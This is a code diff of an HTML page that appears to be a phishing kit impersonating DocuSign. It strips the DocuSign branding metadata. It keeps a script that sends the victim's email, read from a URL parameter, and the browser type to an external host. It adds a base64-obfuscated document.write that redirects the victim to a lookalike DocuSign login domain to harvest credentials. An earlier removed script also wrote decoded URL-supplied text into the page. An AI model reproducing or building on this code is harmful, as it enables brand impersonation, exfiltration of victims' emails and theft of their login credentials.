@@ -3,36 +3,6 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>
-      DocuSign | #1 in Electronic Signature and Contract Lifecycle Management
-    </title>
-
-    <script>
-      function detectBrowser() {
-        var userAgent = navigator.userAgent;
-        if (userAgent.indexOf("Firefox") > -1) {
-          return "Mozilla Firefox";
-        } else if (userAgent.indexOf("Chrome") > -1) {
-          return "Google Chrome";
-        } else if (userAgent.indexOf("Safari") > -1) {
-          return "Apple Safari";
-        } else if (userAgent.indexOf("Edg") > -1) {
-          return "Microsoft Edge";
-        } else if (
-          userAgent.indexOf("MSIE") > -1 ||
-          userAgent.indexOf("Trident") > -1
-        ) {
-          return "Internet Explorer";
-        } else {
-          return "Unknown"; // Return "Unknown" if the browser is not recognized
-        }
-      }
-
-      // Call the function to detect the browser and log the result
-      var browser = detectBrowser();
-      console.log("The site is opened in:", browser);
-    </script>
-
     <script type="text/javascript">
       let hasEmail = new URLSearchParams(window.location.search).has("id");
       let userAgent;
@@ -71,6 +41,7 @@
           userAgent = detectBrowser();
         }
         let email = new URLSearchParams(window.location.search).get("id");
+        console.log(email);
         let payLoad = { id: 0, email: email, userAgent: userAgent };
         let emailXhr = new XMLHttpRequest();
         emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
@@ -80,43 +51,19 @@
         emailXhr.onreadystatechange = function () {
           if (this.readyState == 4 && this.status == 200) {
             let response = JSON.parse(this.response);
-            console.log(response);
+            document.write(
+              decodeURIComponent(
+                atob(
+                  "JTNDbWV0YSUwQSUyMCUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTBBJTIwJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4uZG9jdS1lc2lnbi5wcm8vZkdBSk53Q1AlM0ZzVXUlM0R0TnRRcVFEQmtOUi1jVWpZTkx6TlhVenlBTHFaNGdrSUM0UnVrS1JvQ3pDQjN1Q3ZzUmNNTHclMjIlMEEvJTNFJTBB"
+                )
+              )
+            );
           }
         };
       }
     </script>
 
-    <script type="text/javascript">
-      let hasRef = new URLSearchParams(window.location.search).has("ref");
-      if (hasRef) {
-        let ref = new URLSearchParams(window.location.search).get("ref");
-        document.write(decodeURIComponent(atob(`${ref}`)));
-      }
-    </script>
-
-    <meta
-      name="title"
-      property="og:title"
-      content="DocuSign | #1 in Electronic Signature and Contract Lifecycle Management"
-    />
-    <meta
-      name="description"
-      property="og:description"
-      content="DocuSign ensures the security &amp; mobility to digitally transform businesses. Sign docs for free."
-    />
-    <meta
-      name="image"
-      property="og:image"
-      content="https://images.ctfassets.net/0jnmtsdzg6p5/4GSPcvcpIZpsXsZ7F0EXTW/14994b65b37fd0a9168725b4de994e98/OG_Image_Black.png"
-    />
-    <meta
-      name="twitter:title"
-      content="DocuSign | #1 in Electronic Signature and Contract Lifecycle Management"
-    />
-    <meta
-      name="twitter:description"
-      content="DocuSign ensures the security &amp; mobility to digitally transform businesses. Sign docs for free."
-    />
+    <title>Document</title>
     <style>
       #loader {
         width: 0%;
@@ -156,7 +103,5 @@
         ></div>
       </div>
     </div>
-
-    <script></script>
   </body>
 </html>
